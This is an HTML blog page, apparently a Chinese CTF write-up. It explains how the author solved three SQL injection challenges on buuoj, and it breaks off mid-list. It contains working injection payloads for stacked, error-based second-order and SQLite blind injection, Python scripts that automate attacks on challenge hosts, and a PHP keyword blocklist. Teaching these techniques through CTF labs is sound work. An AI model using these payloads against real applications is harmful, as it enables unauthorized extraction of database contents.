@@ -1,0 +1,1389 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="wp,buuoj,SQL,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="peri0d的博客" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="buuoj 上的几个注入，作为学校团队分享的材料">
+<meta name="keywords" content="wp,buuoj,SQL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuoj的几个SQL注入">
+<meta property="og:url" content="http://yoursite.com/2019/09/28/buu SQL注入/index.html">
+<meta property="og:site_name" content="peri0d的博客">
+<meta property="og:description" content="buuoj 上的几个注入，作为学校团队分享的材料">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_1.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_2.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_3.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_4.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_5.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_1.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_2.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_3.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_4.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_5.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_6.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_7.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_1.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_2.png">
+<meta property="og:updated_time" content="2019-09-28T09:46:37.055Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="buuoj的几个SQL注入">
+<meta name="twitter:description" content="buuoj 上的几个注入，作为学校团队分享的材料">
+<meta name="twitter:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/28/buu SQL注入/">
+
+
+
+
+
+  <title>buuoj的几个SQL注入 | peri0d的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?351c3c63a2d13254dc54096c79858649";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">peri0d的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">我是一只小兔子</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/28/buu SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peri0d">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/toux.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peri0d的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">buuoj的几个SQL注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-28T17:47:19+08:00">
+                2019-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-wp/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF wp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/09/28/buu SQL注入/" class="leancloud_visitors" data-flag-title="buuoj的几个SQL注入">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>buuoj 上的几个注入，作为学校团队分享的材料</p>
+<a id="more"></a>
+
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><ul>
+<li><a href="https://peri0d.xyz/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">堆叠注入</a></li>
+</ul>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><ul>
+<li><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easy_sql" target="_blank" rel="noopener">easy_sql github</a></p>
+</li>
+<li><p>打开靶机，是这样的界面</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_1.png" alt></p>
+</li>
+<li><p>直接用字典 fuzz 看一下过滤了哪些字符，如图</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_2.png" alt></p>
+</li>
+<li><p>这个和强网杯相似，都是堆叠注入，在公开的源码中可以看到，传入的 <code>query</code> 长度不超过 40，强网杯的不能用了</p>
+</li>
+<li><p>关键的查询代码是 <code>select $post[&#39;query&#39;]||flag from Flag</code> </p>
+</li>
+<li><p>输入 1 或 0 查询结果如图，要想办法让 <code>||</code> 不是逻辑或</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_3.png" alt></p>
+</li>
+<li><p>官方给的 payload 是 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> </p>
+</li>
+<li><p>拼接一下就是 <code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code> </p>
+</li>
+<li><p>关于 <code>sql_mode</code> : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 <code>PIPES_AS_CONCAT</code> 将 <code>||</code> 视为字符串的连接操作符而非 “或” 运算符</p>
+</li>
+<li><p>关于 <code>sql_mode</code> 更多可以查看这个链接 : <a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">MySQL sql_mode 说明</a></p>
+</li>
+<li><p>还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 <code>||</code> 相当于是将 <code>select 1</code> 和 <code>select flag from flag</code> 的结果拼接在一起</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_4.png" alt></p>
+</li>
+<li><p>关于非预期解 : <code>*,1</code> </p>
+</li>
+<li><p>拼接一下，不难理解 : <code>select *,1||flag from Flag</code> </p>
+</li>
+<li><p>等同于 <code>select *,1 from Flag</code> </p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/su_ezsql_5.png" alt></p>
+</li>
+</ul>
+<h1 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h1><ul>
+<li><p><a href="https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/RCTF2015/easysql" target="_blank" rel="noopener">EasySQL github</a></p>
+</li>
+<li><p>打开靶机，是如下界面</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_1.png" alt></p>
+</li>
+<li><p>到注册页面，试了一下，<code>username</code> 和 <code>email</code> 处有过滤，直接 fuzz 一下哪些字符被禁了</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_2.png" alt></p>
+</li>
+<li><p>注册成功之后，有一个修改密码的功能，这里的考点应该就是二次注入</p>
+</li>
+<li><p>它在存入数据库时进行了特殊字符的处理，但是在修改密码这里，从数据库中读取出来时，没有对数据处理</p>
+</li>
+<li><p>注册用户名 <code>&#39;sss&quot;\</code> ，在修改密码处的有个报错的回显</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_3.png" alt></p>
+</li>
+<li><p>可以猜出来 sql 语句应该是类似于这样子的 <code>select * from user where username=&quot;&#39;sss&quot;\&quot; and password=&#39;d41d8cd98f00b204e9800998ecf8427e&#39;</code> </p>
+</li>
+<li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</code> </p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_4.png" alt></p>
+</li>
+<li><p>经过测试，flag 不在 flag 表中</p>
+</li>
+<li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</code> </p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_5.png" alt></p>
+</li>
+<li><p>发现输出有长度限制</p>
+</li>
+<li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1))#</code> </p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_6.png" alt></p>
+</li>
+<li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</code> </p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/rctf2015_ezsql_7.png" alt></p>
+</li>
+<li><p>这里就很尴尬了，所以不如 <code>reverse</code> 逆序输出</p>
+</li>
+<li><p><code>username=peri0d&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;f&#39;))),1))#</code> </p>
+</li>
+<li><p>放个脚本，代表了这一题的整个流程，也记录的我的犯傻</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_reg = <span class="string">'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/register.php'</span></span><br><span class="line">url_log = <span class="string">'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/login.php'</span></span><br><span class="line">url_change = <span class="string">'http://7e4dcf86-135f-4bad-98e0-1b7ad8318aad.node2.buuoj.cn.wetolink.com:82/changepwd.php'</span></span><br><span class="line"></span><br><span class="line">pre = <span class="string">'peri0d"'</span></span><br><span class="line">suf = <span class="string">"'))),1))#"</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line">s = list(s)</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name)</span>:</span></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">'username'</span> : name,</span><br><span class="line">		<span class="string">'password'</span> : <span class="string">'123'</span>,</span><br><span class="line">		<span class="string">'email'</span> : <span class="string">'123'</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	r.post(url=url_reg, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(name)</span>:</span></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">'username'</span> : name,</span><br><span class="line">		<span class="string">'password'</span> : <span class="string">'123'</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	r.post(url=url_log, data=data)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changepwd</span><span class="params">()</span>:</span></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">'oldpass'</span> : <span class="string">''</span>,</span><br><span class="line">		<span class="string">'newpass'</span> : <span class="string">''</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	kk = r.post(url=url_change, data=data)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'target'</span> <span class="keyword">not</span> <span class="keyword">in</span> kk.text:</span><br><span class="line">		print(kk.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	paylaod = pre + <span class="string">"||(updatexml(1,concat((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('"</span> + i + suf</span><br><span class="line">	register(paylaod)</span><br><span class="line">	login(paylaod)</span><br><span class="line">	changepwd()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h1><ul>
+<li><p>打开靶机，看到投票的页面，并且给了源码</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_1.png" alt></p>
+</li>
+<li><p>在 <code>vote.php</code> 页面 <code>POST</code> 参数 <code>id</code> ，只能为数字。并且在 <code>schema.sql</code> 中发现了 <code>flag</code> 表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS `vote`;</span><br><span class="line">CREATE TABLE `vote` (</span><br><span class="line">  `id` INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">  `name` TEXT NOT NULL,</span><br><span class="line">  `count` INTEGER</span><br><span class="line">);</span><br><span class="line">INSERT INTO `vote` (`name`, `count`) VALUES</span><br><span class="line">  (&apos;dog&apos;, 0),</span><br><span class="line">  (&apos;cat&apos;, 0),</span><br><span class="line">  (&apos;zebra&apos;, 0),</span><br><span class="line">  (&apos;koala&apos;, 0);</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS `flag`;</span><br><span class="line">CREATE TABLE `flag` (</span><br><span class="line">  `flag` TEXT NOT NULL</span><br><span class="line">);</span><br><span class="line">INSERT INTO `flag` VALUES (&apos;HarekazeCTF&#123;&lt;redacted&gt;&#125;&apos;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在 <code>vote.php</code> 中给出了查询的 SQL 语句，但是对参数进行了检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">'\s'</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">'blob'</span>, <span class="string">'load_extension'</span>, <span class="string">'char'</span>, <span class="string">'unicode'</span>,</span><br><span class="line">    <span class="string">'(in|sub)str'</span>, <span class="string">'[lr]trim'</span>, <span class="string">'like'</span>, <span class="string">'glob'</span>, <span class="string">'match'</span>, <span class="string">'regexp'</span>,</span><br><span class="line">    <span class="string">'in'</span>, <span class="string">'limit'</span>, <span class="string">'order'</span>, <span class="string">'union'</span>, <span class="string">'join'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'Vote id contains dangerous chars'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:../db/vote.db'</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>UPDATE</code> 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 <code>&#39;</code> 和 <code>&quot;</code> 这就无法使用字符进行判断，<code>char</code> 又被过滤也无法使用 ASCII 码判断</p>
+</li>
+<li><p>所以可以考虑使用 <code>hex</code> 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示</p>
+</li>
+<li><p>先考虑对 flag 16 进制长度的判断，假设它的长度为 <code>x</code>，<code>y</code> 表示 2 的 n 次方，那么 <code>x&amp;y</code> 就能表现出 <code>x</code> 二进制为 1 的位置，将这些 <code>y</code> 再进行或运算就可以得到完整的 <code>x</code> 的二进制，也就得到了 flag 的长度，而 <code>1&lt;&lt;n</code> 恰可以表示 2 的 n 次方</p>
+</li>
+<li><p>那么如何构造报错语句呢？在 <code>sqlite</code> 中，<code>abs</code> 函数有一个整数溢出的报错，如果 <code>abs</code> 的参数是 <code>-9223372036854775808</code> 就会报错，同样如果是正数也会报错</p>
+</li>
+<li><p>判断长度的 payload : <code>abs(case(length(hex((select(flag)from(flag))))&amp;{1&lt;&lt;n})when(0)then(0)else(0x8000000000000000)end)</code> </p>
+</li>
+<li><p>脚本如下，长度 84</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php"</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	payload = <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;n&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">'id'</span> : payload</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	r = requests.post(url=url, data=data)</span><br><span class="line">	print(r.text)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'occurred'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		l = l|<span class="number">1</span>&lt;&lt;n</span><br><span class="line"></span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/buuoj/Harekaze2019_vote_2.png" alt></p>
+</li>
+<li><p>然后考虑逐字符进行判断，但是 <code>is_valid()</code> 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断</p>
+</li>
+<li><p>这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 <code>ABCDEF</code> ，这样十六进制的所有字符都可以使用了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hex(b'zebra') = 7A65627261</span></span><br><span class="line"><span class="comment"># 除去 12567 就是 A ，其余同理</span></span><br><span class="line">A = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line"></span><br><span class="line">C = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line"></span><br><span class="line">D = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line"></span><br><span class="line">E = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line"></span><br><span class="line">F = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hex(b'koala') = 6B6F616C61</span></span><br><span class="line"><span class="comment"># 除去 16CF 就是 B</span></span><br><span class="line">B = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;C&#125;</span>||<span class="subst">&#123;F&#125;</span>)'</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后逐字符进行爆破，已经知道 flag 格式为 <code>flag{}</code> ，<code>hex(b&#39;flag{&#39;)==666C61677B</code>  ，在其后面逐位添加十六进制字符，构成 paylaod</p>
+</li>
